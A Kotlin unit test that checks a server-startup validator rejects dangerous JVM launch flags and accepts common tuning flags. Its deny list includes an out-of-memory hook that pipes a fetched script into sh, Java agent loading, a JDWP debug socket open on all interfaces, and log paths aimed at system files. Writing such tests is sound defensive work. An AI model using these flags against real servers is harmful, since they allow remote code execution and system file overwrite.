package com.panomc.platform.node

import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertNull
import org.junit.jupiter.api.Test

class ServerStartupLimitsTest {
    @Test
    fun `flags that run commands, agents or option files are refused`() {
        listOf(
            "-XX:OnOutOfMemoryError=sh -c 'curl x|sh'",
            "-XX:OnError=id",
            "-XX:VMOptionsFile=/tmp/x",
            "-XX:Flags=/tmp/x",
            "-XX:+UnlockDiagnosticVMOptions",
            "-XX:ErrorFile=/etc/cron.d/x",
            "-XX:HeapDumpPath=/root",
            "-javaagent:/tmp/a.jar",
            "-agentpath:/tmp/a.so",
            "-agentlib:jdwp=transport=dt_socket,server=y,address=*:5005",
            "-Xrunjdwp:transport=dt_socket",
            "-Xlog:gc:file=/etc/passwd",
            "-Djava.library.path=/tmp",
            "-Djava.ext.dirs=/tmp",
            "-Dcom.sun.management.jmxremote.port=9010",
            "--patch-module=java.base=/tmp",
            "-jar",
            "-cp=/tmp",
            "@/tmp/args",
            "Main"
        ).forEach { arg ->
            assertEquals(arg, ServerStartupLimits.launchChangingJvmArg(listOf("-Xmx2G", arg)), arg)
        }
    }

    @Test
    fun `common tuning flags are kept`() {
        val aikar = listOf(
            "-Xms4G", "-Xmx4G", "-Xss1M", "-XX:+UseG1GC", "-XX:+ParallelRefProcEnabled", "-XX:MaxGCPauseMillis=200",
            "-XX:+UnlockExperimentalVMOptions", "-XX:+DisableExplicitGC", "-XX:+AlwaysPreTouch",
            "-XX:G1NewSizePercent=30", "-XX:G1HeapRegionSize=8M", "-Dusing.aikars.flags=https://mcflags.emc.gs",
            "-Daikars.new.flags=true", "-Dfile.encoding=UTF-8", "-Xlog:gc", "--add-opens=java.base/java.lang=ALL-UNNAMED",
            "-Dcom.mojang.eula.agree=true"
        )

        assertNull(ServerStartupLimits.launchChangingJvmArg(aikar))
    }
}
